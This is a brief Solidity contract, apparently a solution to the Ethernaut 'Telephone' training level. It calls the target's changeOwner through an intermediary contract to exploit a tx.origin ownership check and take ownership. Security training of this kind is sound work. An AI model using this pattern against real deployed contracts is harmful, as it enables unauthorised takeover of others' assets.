// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0 <0.9.0;

import "./levels/Telephone.sol";

contract TelephoneAttack {
    address private _ethernautContract;

    constructor(address _contractAddr) {
        _ethernautContract = _contractAddr;
    }

    function changeOwner() public {
        Telephone(_ethernautContract).changeOwner(msg.sender);
    }
}
